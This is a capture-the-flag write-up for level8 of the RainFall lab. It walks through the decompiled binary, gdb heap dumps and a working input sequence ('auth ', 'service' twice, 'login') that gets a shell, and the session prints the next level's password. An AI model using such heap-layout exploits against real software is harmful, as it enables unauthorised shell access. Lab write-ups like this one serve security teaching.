## Step 1: Static & Dynamic Analysis

```c
08048564    int32_t main(int32_t argc, char** argv, char** envp)
08048564    {
08048564        while (true)
08048591        {
08048591            uint32_t* const fp;
08048591            printf("%p, %p \n", auth, service, fp);
080485b3            bool c_1 = false;
080485b3            void buf;
080485b3            bool z_1 = !fgets(&buf, 128, stdin);
080485b3            
080485b5            if (z_1)
080485b5                break;
080485b5            
080485c6            int32_t i = 5;
080485cb            void* buf_cpy = &buf;
080485cd            char const* const auth_str = "auth ";
080485cd            
080485cf            while (i)
080485cf            {
080485cf                char char_buff = *(uint8_t*)buf_cpy;
080485cf                char const char_auth = *(uint8_t*)auth_str;
080485cf                c_1 = char_buff < char_auth;
080485cf                z_1 = char_buff == char_auth;
080485cf                buf_cpy += 1;
080485cf                auth_str = &auth_str[1];
080485cf                i -= 1;
080485cf                
080485cf                if (!z_1)
080485cf                    break;
080485cf            }
080485cf            
080485e0            bool c_2 = false;
080485e0            bool z_2 = !(int32_t)((!z_1 && !c_1) - c_1);
080485e0            
080485e2            if (z_2)
080485e2            {
080485f0                auth = malloc(4);
080485fa                **(uint32_t**)&auth = 0;
08048616                int32_t i_1 = -1;
0804861a                void var_8b;
0804861a                void* edi_1 = &var_8b;
0804861a                
0804861c                while (i_1)
0804861c                {
0804861c                    bool cond:4_1 = 0 != *(uint8_t*)edi_1;
0804861c                    edi_1 += 1;
0804861c                    i_1 -= 1;
0804861c                    
0804861c                    if (!cond:4_1)
0804861c                        break;
0804861c                }
0804861c                
08048625                c_2 = ~i_1 - 1 < 0x1e;
08048625                z_2 = ~i_1 == 0x1f;
08048625                
08048628                if (z_2 || c_2)
0804863d                    strcpy(auth, &var_8b);
080485e2            }
080485e2            
0804864d            int32_t i_2 = 5;
08048652            void* esi_1 = &buf;
08048654            char const* const edi_2 = "reset";
08048654            
08048656            while (i_2)
08048656            {
08048656                char temp2_1 = *(uint8_t*)esi_1;
08048656                char const temp3_1 = *(uint8_t*)edi_2;
08048656                c_2 = temp2_1 < temp3_1;
08048656                z_2 = temp2_1 == temp3_1;
08048656                esi_1 += 1;
08048656                edi_2 = &edi_2[1];
08048656                i_2 -= 1;
08048656                
08048656                if (!z_2)
08048656                    break;
08048656            }
08048656            
08048667            bool c_3 = false;
08048667            bool z_3 = !(int32_t)((!z_2 && !c_2) - c_2);
08048667            
08048669            if (z_3)
08048673                free(auth);
08048673            
08048683            int32_t i_3 = 6;
08048688            void* esi_2 = &buf;
0804868a            char const* const edi_3 = "service";
0804868a            
0804868c            while (i_3)
0804868c            {
0804868c                char temp4_1 = *(uint8_t*)esi_2;
0804868c                char const temp5_1 = *(uint8_t*)edi_3;
0804868c                c_3 = temp4_1 < temp5_1;
0804868c                z_3 = temp4_1 == temp5_1;
0804868c                esi_2 += 1;
0804868c                edi_3 = &edi_3[1];
0804868c                i_3 -= 1;
0804868c                
0804868c                if (!z_3)
0804868c                    break;
0804868c            }
0804868c            
0804869d            bool c_4 = false;
0804869d            bool z_4 = !(int32_t)((!z_3 && !c_3) - c_3);
0804869d            
0804869f            if (z_4)
0804869f            {
080486a5                c_4 = &buf >= 0xfffffff9;
080486a5                z_4 = &buf == 0xfffffff9;
080486b0                void s;
080486b0                service = strdup(&s);
0804869f            }
0804869f            
080486c0            int32_t i_4 = 5;
080486c5            void* esi_3 = &buf;
080486c7            char const* const edi_4 = "login";
080486c7            
080486c9            while (i_4)
080486c9            {
080486c9                char temp7_1 = *(uint8_t*)esi_3;
080486c9                char const temp8_1 = *(uint8_t*)edi_4;
080486c9                c_4 = temp7_1 < temp8_1;
080486c9                z_4 = temp7_1 == temp8_1;
080486c9                esi_3 += 1;
080486c9                edi_4 = &edi_4[1];
080486c9                i_4 -= 1;
080486c9                
080486c9                if (!z_4)
080486c9                    break;
080486c9            }
080486c9            
080486dc            if (!(int32_t)((!z_4 && !c_4) - c_4))
080486dc            {
080486ec                if (!*(uint32_t*)(auth + 32))
080486ec                {
0804870b                    fp = stdout;
08048722                    fwrite("Password:\n", 1, 10, fp);
080486ec                }
080486ec                else
080486f5                    system("/bin/sh");
080486dc            }
08048591        }
08048591        
08048738        return 0;
08048564    }
```

### Explanation

The binary expects one of these four specific strings as input: `auth `, `reset`, `service`, and `login`. For our exploit, we will only focus on `auth `, `service`, and `login`.

The final check before spawning a shell occurs in the `login` part. It verifies that the value at `auth + 32` is not null. The `auth` variable is a global variable initially set to null. When the user inputs `auth `, the binary allocates `4` bytes of memory and sets the pointer to this allocated memory in the `auth` variable. It then uses `strcpy()` to copy a `\n` into this memory.

Our goal is to ensure that `auth + 32` is set to a non-null value to pass the check and spawn the shell.

To achieve this, we leverage the `service` input functionality. When the user inputs `service`, the binary allocates another block of memory directly after the previous allocation and also stores a `\n` in it.

```asm
(gdb) x/12wx auth
0x804a008:      0x0000000a      0x00000000      0x00000000      0x00020ff1
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
```

After providing the `auth ` input, we can see that the first block contains `0x0000000a` (representing `\n`).

```asm
(gdb) x/12wx auth
0x804a008:      0x0000000a      0x00000000      0x00000000      0x00000011
0x804a018:      0x0000000a      0x00000000      0x00000000      0x00020fe1
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
```

Next, when `service` is given as input, we can observe that another memory block is allocated immediately after the `auth ` block, aligned to `16-byte` boundaries.

```asm
0x804a008:      0x0000000a      0x00000000      0x00000000      0x00000011
0x804a018:      0x0000000a      0x00000000      0x00000000      0x00000011
0x804a028:      0x0000000a      0x00000000      0x00000000      0x00020fd1
```

By providing `service` as input one more time, we ensure that `auth + 32` is no longer null. Now, when we input `login`, the binary performs the check, finds that `auth + 32` is set, and spawns a shell.

```bash
login
$ id
uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
```

## Step 2: Exploiting the Binary

```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login

$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```